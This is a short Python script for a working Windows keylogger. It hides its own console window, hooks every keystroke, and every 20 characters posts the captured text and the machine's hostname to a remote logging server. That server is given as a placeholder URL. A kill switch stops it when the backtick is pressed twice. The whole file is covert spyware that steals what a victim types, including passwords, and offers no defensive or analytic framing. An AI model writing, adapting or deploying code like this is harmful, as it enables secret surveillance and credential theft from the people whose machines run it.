import pythoncom, pyHook
import platform
import requests
import sys
import win32api
import win32console
import win32gui


# Get the console windows and hiding it
# so that app runs in the background
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

# flag is to check whether `` is pressed twice
flag = 0
wbuffer = ''
hostname = platform.node()

def postRequest(param):
  global hostname
  payload = {'word' : param, 'hostname' : hostname}
  r = requests.post('http://your_server_name.com/httplib/post/logger.php',data=payload)

def OnKeyboardEvent(event):
  global flag
  global wbuffer
  
  # logging is is stopped while pressing `` ( 2 times )
  if event.Ascii == 96 :
    flag += 1
    if flag > 1:
      if wbuffer:
        postRequest(wbuffer)
        
      sys.exit() 
  if event.Ascii != 0 or 8: 
    key = chr(event.Ascii)

    #creating a payload and sending it to localhost
    wbuffer += key

    if len(wbuffer) == 20:
      postRequest(wbuffer)
      wbuffer = ''
      

#creating a hook object
hm = pyHook.HookManager()

#hooking the key event with our function OnKeyboardEvent
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard() 

# pumps the windows messages to the main thread in an infinite loop
pythoncom.PumpMessages()
  
